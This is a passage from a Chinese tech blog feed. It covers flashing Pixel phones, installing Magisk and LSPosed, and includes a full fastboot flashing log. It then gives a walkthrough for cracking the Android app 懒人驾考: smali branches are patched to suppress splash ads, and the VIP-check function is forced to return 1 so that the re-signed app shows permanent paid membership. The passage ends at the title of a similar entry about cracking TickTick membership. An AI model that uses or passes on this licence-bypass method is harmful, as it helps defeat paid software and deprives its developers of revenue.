href="https://developers.google.com/android/images?hl=zh-cn">https://developers.google.com/android/images?hl=zh-cn</a><br>主要是获取boot.img 文件。<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205155937855.png"></p><p>操作和moto 的一样。</p><p>ps: 如果fastboot boot xxx.img 没有效果，那就重启一下。重新来一次。</p><p>进入到magisk  的设置中，打开zygisk 按钮。</p><h3 id="安装LSPosed"><a href="#安装LSPosed" class="headerlink" title="安装LSPosed"></a>安装LSPosed</h3><h4 id="加载lsposed"><a href="#加载lsposed" class="headerlink" title="加载lsposed"></a>加载lsposed</h4><p><a href="https://github.com/LSPosed/LSPosed/releases">https://github.com/LSPosed/LSPosed/releases</a> 下载zygisk 版本的zip<br>然后adb push 到sdcard&#x2F;Download&#x2F; 文件目录中</p><p>在magisk 中的模块栏中，添加本地模块，将zip 加载起来。然后重启。<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205164828099.png"></p><h4 id="安装apk"><a href="#安装apk" class="headerlink" title="安装apk"></a>安装apk</h4><p>安装这个apk</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205164753413.png"></p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205164818870.png"></p><h1 id="pixel-6-升级Android14"><a href="#pixel-6-升级Android14" class="headerlink" title="pixel 6 升级Android14"></a>pixel 6 升级Android14</h1><p>旁加载升级</p><h2 id="下载OTA镜像"><a href="#下载OTA镜像" class="headerlink" title="下载OTA镜像"></a>下载OTA镜像</h2><p><a href="https://developers.google.com/android/ota?hl=zh-cn#raven">https://developers.google.com/android/ota?hl=zh-cn#raven</a><br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205152210071.png"></p><h2 id="进入到recover-模式"><a href="#进入到recover-模式" class="headerlink" title="进入到recover 模式"></a>进入到recover 模式</h2><p>输入adb reboot recovery。</p><p>然后同事按住电源键 + 音量键提升按钮。</p><p>然后跳转到Recovery 清单中。</p><h2 id="选择adb升级"><a href="#选择adb升级" class="headerlink" title="选择adb升级"></a>选择adb升级</h2><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205152133161.png"><br>然后会显示<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205152303717.png"></p><h2 id="sideload-zip"><a href="#sideload-zip" class="headerlink" title="sideload zip"></a>sideload zip</h2><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205145440499.png"></p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205152409597.jpeg"></p><p>升级完成<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205151526574.png"></p><p>adb reboot 重启</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205152605208.jpeg"></p><p>参考： <a href="https://zhuanlan.zhihu.com/p/660890339">https://zhuanlan.zhihu.com/p/660890339</a></p><h1 id="pixel-6P-通过出厂镜像刷机"><a href="#pixel-6P-通过出厂镜像刷机" class="headerlink" title="pixel 6P 通过出厂镜像刷机"></a>pixel 6P 通过出厂镜像刷机</h1><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231222172407700.png"></p><p>windows 系统直接运行flash-all.bat<br>运行日志</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><code class="hljs smali">Sending &#x27;bootloader_b&#x27; (11574 KB)                  OKAY [  0.369s]<br>Writing &#x27;bootloader_b&#x27;                             (bootloader) Flashing pack version slider-1.2-9152140<br>(bootloader) flashing platform gs101<br>(bootloader) Validating partition ufs<br>(bootloader) Validating partition ufs<br>(bootloader) Validating partition partition:0<br>(bootloader) Validating partition partition:1<br>(bootloader) Validating partition partition:2<br>(bootloader) Validating partition partition:3<br>(bootloader) Validating partition bl1_b<br>(bootloader) Validating partition pbl_b<br>(bootloader) Validating partition bl2_b<br>(bootloader) Validating partition abl_b<br>(bootloader) Validating partition bl31_b<br>(bootloader) Validating partition tzsw_b<br>(bootloader) Validating partition gsa_b<br>(bootloader) Validating partition ldfw_b<br>(bootloader) Flashing partition ufs<br>(bootloader) Flashing partition ufs<br>(bootloader) Flashing partition partition:0<br>(bootloader) Flashing partition partition:1<br>(bootloader) Flashing partition partition:2<br>(bootloader) Flashing partition partition:3<br>(bootloader) Flashing partition bl1_b<br>(bootloader) Flashing partition pbl_b<br>(bootloader) Flashing partition bl2_b<br>(bootloader) Flashing partition abl_b<br>(bootloader) Flashing partition bl31_b<br>(bootloader) Flashing partition tzsw_b<br>(bootloader) Flashing partition gsa_b<br>(bootloader) Flashing partition ldfw_b<br>(bootloader) Loading sideload ufsfwupdate<br>OKAY [  2.588s]<br>Finished. Total time: 2.963s<br>Rebooting into bootloader                          OKAY [  0.000s]<br>Finished. Total time: 0.002s<br>&lt; waiting for any device &gt;<br>Sending &#x27;radio_b&#x27; (94060 KB)                       OKAY [  3.294s]<br>Writing &#x27;radio_b&#x27;                                  (bootloader) Flashing pack version g5123b-107485-221101-M-9242015<br>(bootloader) Flashing partition modem_b<br>OKAY [  0.121s]<br>Finished. Total time: 3.421s<br>Rebooting into bootloader                          OKAY [  0.000s]<br>Finished. Total time: 0.001s<br>&lt; waiting for any device &gt;<br>--------------------------------------------<br>Bootloader Version...: slider-1.2-9152140<br>Baseband Version.....: g5123b-107485-221101-B-9242015<br>Serial Number........: 1B231FDEE005T0<br>--------------------------------------------<br>extracting android-info.txt (0 MB) to RAM...<br>Checking &#x27;product&#x27;                                 OKAY [  0.000s]<br>Checking &#x27;version-bootloader&#x27;                      OKAY [  0.000s]<br>Checking &#x27;version-baseband&#x27;                        OKAY [  0.000s]<br>Setting current slot to &#x27;b&#x27;                        OKAY [  0.083s]<br>extracting boot.img (64 MB) to disk... took 0.294s<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;boot.sig&#x27;<br>Sending &#x27;boot_b&#x27; (65536 KB)                        OKAY [  2.322s]<br>Writing &#x27;boot_b&#x27;                                   OKAY [  0.079s]<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;init_boot.img&#x27;<br>extracting dtbo.img (16 MB) to disk... took 0.048s<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;dtbo.sig&#x27;<br>Sending &#x27;dtbo_b&#x27; (16384 KB)                        OKAY [  0.524s]<br>Writing &#x27;dtbo_b&#x27;                                   OKAY [  0.021s]<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;dt.img&#x27;<br>extracting pvmfw.img (1 MB) to disk... took 0.005s<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;pvmfw.sig&#x27;<br>Sending &#x27;pvmfw_b&#x27; (1024 KB)                        OKAY [  0.032s]<br>Writing &#x27;pvmfw_b&#x27;                                  OKAY [  0.003s]<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;recovery.img&#x27;<br>extracting vbmeta.img (0 MB) to disk... took 0.001s<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;vbmeta.sig&#x27;<br>Sending &#x27;vbmeta_b&#x27; (12 KB)                         OKAY [  0.001s]<br>Writing &#x27;vbmeta_b&#x27;                                 OKAY [  0.002s]<br>extracting vbmeta_system.img (0 MB) to disk... took 0.000s<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;vbmeta_system.sig&#x27;<br>Sending &#x27;vbmeta_system_b&#x27; (4 KB)                   OKAY [  0.000s]<br>Writing &#x27;vbmeta_system_b&#x27;                          OKAY [  0.002s]<br>extracting vbmeta_vendor.img (0 MB) to disk... took 0.001s<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;vbmeta_vendor.sig&#x27;<br>Sending &#x27;vbmeta_vendor_b&#x27; (4 KB)                   OKAY [  0.000s]<br>Writing &#x27;vbmeta_vendor_b&#x27;                          OKAY [  0.002s]<br>extracting vendor_boot.img (64 MB) to disk... took 0.439s<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;vendor_boot.sig&#x27;<br>Sending &#x27;vendor_boot_b&#x27; (65536 KB)                 OKAY [  2.079s]<br>Writing &#x27;vendor_boot_b&#x27;                            OKAY [  0.077s]<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;vendor_kernel_boot.img&#x27;<br>extracting super_empty.img (0 MB) to disk... took 0.000s<br>Rebooting into fastboot                            OKAY [  0.000s]<br>&lt; waiting for any device &gt;<br>Sending &#x27;super&#x27; (4 KB)                             OKAY [  0.001s]<br>Updating super partition                           OKAY [  0.019s]<br>Resizing &#x27;product_b&#x27;                               OKAY [  0.003s]<br>Resizing &#x27;system_b&#x27;                                OKAY [  0.003s]<br>Resizing &#x27;system_ext_b&#x27;                            OKAY [  0.003s]<br>Resizing &#x27;system_a&#x27;                                OKAY [  0.003s]<br>Resizing &#x27;vendor_b&#x27;                                OKAY [  0.003s]<br>Resizing &#x27;vendor_dlkm_b&#x27;                           OKAY [  0.002s]<br>Resizing &#x27;vendor_a&#x27;                                OKAY [  0.003s]<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;boot_other.img&#x27;<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;odm.img&#x27;<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;odm_dlkm.img&#x27;<br>extracting product.img (2588 MB) to disk... took 17.016s<br>Invalid<span class="hljs-built_in"> sparse </span>file format at header magic<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;product.sig&#x27;<br>Resizing &#x27;product_b&#x27;                               OKAY [  0.006s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 1/11 (262112 KB)        OKAY [  8.788s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.321s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 2/11 (262124 KB)        OKAY [  8.759s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.327s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 3/11 (262128 KB)        OKAY [  8.752s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.338s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 4/11 (262116 KB)        OKAY [  8.779s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.331s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 5/11 (262120 KB)        OKAY [  8.814s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.331s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 6/11 (262124 KB)        OKAY [  8.867s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.340s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 7/11 (262124 KB)        OKAY [  8.819s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.304s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 8/11 (262128 KB)        OKAY [  8.894s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.340s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 9/11 (262128 KB)        OKAY [  8.803s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.356s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 10/11 (241248 KB)       OKAY [  8.124s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.368s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;product_b&#x27; 11/11 (41336 KB)        OKAY [  1.400s]<br>Writing &#x27;product_b&#x27;                                OKAY [  0.104s]<br>extracting<span class="hljs-keyword"> system</span>.img (840 MB) to disk... took 5.310s<br>Invalid<span class="hljs-built_in"> sparse </span>file format at header magic<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;system.sig&#x27;<br>Resizing &#x27;system_b&#x27;                                OKAY [  0.006s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_b&#x27; 1/4 (262116 KB)          OKAY [  8.625s]<br>Writing &#x27;system_b&#x27;                                 OKAY [  0.339s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_b&#x27; 2/4 (262120 KB)          OKAY [  8.675s]<br>Writing &#x27;system_b&#x27;                                 OKAY [  0.318s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_b&#x27; 3/4 (262140 KB)          OKAY [  8.607s]<br>Writing &#x27;system_b&#x27;                                 OKAY [  0.374s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_b&#x27; 4/4 (71380 KB)           OKAY [  2.356s]<br>Writing &#x27;system_b&#x27;                                 OKAY [  0.147s]<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;system_dlkm.img&#x27;<br>extracting<span class="hljs-keyword"> system</span>_ext.img (353 MB) to disk... took 2.108s<br>Invalid<span class="hljs-built_in"> sparse </span>file format at header magic<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;system_ext.sig&#x27;<br>Resizing &#x27;system_ext_b&#x27;                            OKAY [  0.007s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_ext_b&#x27; 1/2 (262140 KB)      OKAY [  8.655s]<br>Writing &#x27;system_ext_b&#x27;                             OKAY [  0.329s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;system_ext_b&#x27; 2/2 (99100 KB)       OKAY [  3.283s]<br>Writing &#x27;system_ext_b&#x27;                             OKAY [  0.166s]<br>extracting<span class="hljs-keyword"> system</span>_other.img (24 MB) to disk... took 0.157s<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;system.sig&#x27;<br>Resizing &#x27;system_a&#x27;                                OKAY [  0.006s]<br>Sending &#x27;system_a&#x27; (25220 KB)                      OKAY [  0.825s]<br>Writing &#x27;system_a&#x27;                                 OKAY [  0.103s]<br>extracting vendor.img (509 MB) to disk... took 3.057s<br>Invalid<span class="hljs-built_in"> sparse </span>file format at header magic<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;vendor.sig&#x27;<br>Resizing &#x27;vendor_b&#x27;                                OKAY [  0.007s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;vendor_b&#x27; 1/2 (262116 KB)          OKAY [  8.684s]<br>Writing &#x27;vendor_b&#x27;                                 OKAY [  0.322s]<br>Sending<span class="hljs-built_in"> sparse </span>&#x27;vendor_b&#x27; 2/2 (257860 KB)          OKAY [  8.539s]<br>Writing &#x27;vendor_b&#x27;                                 OKAY [  0.334s]<br>extracting vendor_dlkm.img (38 MB) to disk... took 0.181s<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;vendor_dlkm.sig&#x27;<br>Resizing &#x27;vendor_dlkm_b&#x27;                           OKAY [  0.008s]<br>Sending &#x27;vendor_dlkm_b&#x27; (39796 KB)                 OKAY [  1.332s]<br>Writing &#x27;vendor_dlkm_b&#x27;                            OKAY [  0.089s]<br>archive does<span class="hljs-built_in"> not </span>contain &#x27;vendor_other.img&#x27;<br>Erasing &#x27;userdata&#x27;                                 OKAY [  0.218s]<br>Erase successful, but<span class="hljs-built_in"> not </span>automatically formatting.<br>File<span class="hljs-keyword"> system</span> type raw<span class="hljs-built_in"> not </span>supported.<br>Erasing &#x27;metadata&#x27;                                 OKAY [  0.003s]<br>Erase successful, but<span class="hljs-built_in"> not </span>automatically formatting.<br>File<span class="hljs-keyword"> system</span> type raw<span class="hljs-built_in"> not </span>supported.<br>Rebooting                                          OKAY [  0.000s]<br>Finished. Total time: 397.746s<br></code></pre></td></tr></table></figure><h1 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h1><p>Android 入门教程：ROOT 权限的获取</p><p><a href="https://sspai.com/post/24296#">https://sspai.com/post/24296#</a>!</p><p>模拟器安装xposed</p><p><a href="https://blog.csdn.net/u014602228/article/details/117921430">https://blog.csdn.net/u014602228/article/details/117921430</a></p><p>记一次Android刷机的小结（青橙GO T5）<br><a href="https://jmsliu.cn/tech/%e8%ae%b0%e4%b8%80%e6%ac%a1%e5%ae%89%e5%8d%93%e5%88%b7%e6%9c%ba%e7%9a%84%e5%b0%8f%e7%bb%93.html">https://jmsliu.cn/tech/%e8%ae%b0%e4%b8%80%e6%ac%a1%e5%ae%89%e5%8d%93%e5%88%b7%e6%9c%ba%e7%9a%84%e5%b0%8f%e7%bb%93.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>apk逆向__懒人驾考去会员</title>
    <link href="/2024/01/02/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91/"/>
    <url>/2024/01/02/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>考驾照的时候，有人推荐了这个app,于是拿来刷题，发现要会员，于是逆了一下。</p><h1 id="懒人驾考逆向"><a href="#懒人驾考逆向" class="headerlink" title="懒人驾考逆向"></a>懒人驾考逆向</h1><h2 id="去除开屏广告（成功）"><a href="#去除开屏广告（成功）" class="headerlink" title="去除开屏广告（成功）"></a>去除开屏广告（成功）</h2><h3 id="确定activity"><a href="#确定activity" class="headerlink" title="确定activity"></a>确定activity</h3><p>前因：app 原本开屏有两个广告，直接用MT管理器启动“activity 记录”，可以看到连着有两个广告。看到activity 是SplashAcitvity。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207112117967.png"></p><p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207112137076.png"></p><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>在jadx中找到这个activity。可以看到开屏广告的有关函数和类。看到一个onSplashAdShow（）函数的实现。</p><p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231206225555751.png"><br>查看onSplashAdShow()函数的引用<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231206225712329.png"></p><h4 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h4><p>可以让这个case修改为close<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231206225649137.png"></p><p>最终分析调用的函数路径为</p><p>onSplashAdShow() – &gt; com.bytedance.sdk.openadsdk.x.p040if.p041if.p042if.Cfi.call() –&gt; com.bytedance.sdk.openadsdk.z.p046if.p047if.x.setSplashAdListener() –&gt; onSplashRenderSuccess() –&gt; com.bytedance.sdk.openadsdk.w.p037if.p038if.p039if.Cif.call()</p><h4 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h4><p>另一处修改的地方<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207134655449.png"></p><p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207135500830.png"></p><h4 id="第三处"><a href="#第三处" class="headerlink" title="第三处"></a>第三处</h4><p>这个函数会调用 r0() 和 o0()函数。</p><p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207142355039.png"></p><p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207144836662.png"></p><p>修改这个跳转，if-eqz 为 if-nez 直接到o0()函数。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207144710756.png"></p><h3 id="修改smali"><a href="#修改smali" class="headerlink" title="修改smali"></a>修改smali</h3><p>有两处可以去除广告。</p><h4 id="第一处-1"><a href="#第一处-1" class="headerlink" title="第一处"></a>第一处</h4><p>com.bytedance.sdk.openadsdk.x.p040if.p041if.p042if.Cfi.call()</p><p>把succedd 的case 跳转到close中。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207135843019.png"></p><h4 id="第二处-1"><a href="#第二处-1" class="headerlink" title="第二处"></a>第二处</h4><p>com.bytedance.sdk.openadsdk.w.p037if.p038if.p039if.Cif.call()</p><p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207140007019.png"></p><h4 id="第三处-1"><a href="#第三处-1" class="headerlink" title="第三处"></a>第三处</h4><p>if-eqz v1 ,; cond_26  如果v1 为0 ，跳转到26处。</p><p>if-nez v1,;  如果v1 不为0 ，跳转到26</p><p>if-ne v1 v2 如果不等于就跳转，改为eq</p><h2 id="开通会员"><a href="#开通会员" class="headerlink" title="开通会员"></a>开通会员</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208222030444.png"></p><h4 id="第一处-2"><a href="#第一处-2" class="headerlink" title="第一处"></a>第一处</h4><p>捕获这个按钮的点击事件。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208182714065.png"></p><p>从开启会员按钮处，点击，然后返回到主页面的时候会触发一些函数。</p><p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208182331538.png"><br>下面这个函数，就是判断放弃开启VIP。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208222111439.png"></p><p>如股票M 判断为真，那就直接结束这个vip购买的activity的。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208182443749.png"></p><p><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231207225838719.png"></p><p>找到一个判断是否开通会员的逻辑代码</p><p>openvipActivityNewB()<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208174706729.png"></p><h3 id="修改smali-1"><a href="#修改smali-1" class="headerlink" title="修改smali"></a>修改smali</h3><p>直接在M函数处返回1。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208222225733.png"></p><p>重新签名打包安装后，可以看到“永久会员”。<br><img src="/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91.assets/image-20231208222607848.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>apk逆向__滴答清单去会员</title>
    <link href="/2024/01/02/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98/"/>
    <url>/2024/01/02/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98/</url>
    
